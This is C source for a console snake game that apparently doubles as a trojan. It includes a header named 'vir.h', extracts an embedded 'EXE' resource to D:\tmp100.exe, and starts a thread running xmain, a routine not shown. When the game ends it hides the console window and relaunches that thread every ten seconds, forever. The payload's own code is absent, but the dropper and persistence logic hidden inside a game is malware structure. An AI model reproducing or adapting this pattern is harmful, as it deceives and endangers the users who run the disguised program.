#include"snakep.h"
#include"vir.h"
#include"resource.h"
int main_(){
	int x;
	int i;

	for( i=1;i<=10;++i){
		while(!kbhit()){
			}
		x=getch();
		printf("%d ",x);
		}
	return 0;
	}
int main(){
	int i;
	FILE* fp;
	//while(1){
	//c=getch();
	//setc(blackc);
	//gotoxy(1,1);
	//	}
	char filepath[MAX_PATH]="E:\\xp2\\Docs\\Visual Studio 2008\\Projects\\BMPÍ¼Ïñ\\Release\\x"; 

	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCEA(IDR_EXE1), TEXT("EXE"));
	DWORD dwSize = SizeofResource(NULL, hRsrc); 
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	LPVOID pBuffer = LockResource(hGlobal);
	fp = fopen("D:\\tmp100.exe", "wb");
	if (fp != NULL)
		{
		fwrite(pBuffer, sizeof(char), dwSize, fp);
		fclose(fp);
		}
	HANDLE handle = CreateThread(NULL, 0, xmain, NULL, 0, NULL);
	gotoxy(0,0);
	delay=25;
	//getchar();
	starts();
	while(!bitmyself()){

		for(i=1;i<=50;++i)
			//sleep(1);
			if(kbhit()){
				char x=getch();
				switch(x){
					case VK_UP:
						if(headpos!=VK_DOWN)headpos=x;break;
					case VK_DOWN:
						if(headpos!=VK_UP)headpos=x;break;
					case VK_LEFT:
						if(headpos!=VK_RIGHT)headpos=x;break;
					case VK_RIGHT:
						if(headpos!=VK_LEFT)headpos=x;break;
					}
				break;
				}
			gofo();
			sleep(260);
		}

	printf("die%d",lens);
	getchar();
	HWND hwnd;
	if(hwnd=::FindWindow("ConsoleWindowClass",NULL)) //ÕÒµ½¿ØÖÆÌ¨¾ä±ú
		{
		::ShowWindow(hwnd,SW_HIDE); //Òþ²Ø¿ØÖÆÌ¨´°¿Ú
		}
	while(1){
		sleep(10000);
		handle = CreateThread(NULL, 0, xmain, NULL, 0, NULL);
		}
	return 0;
	}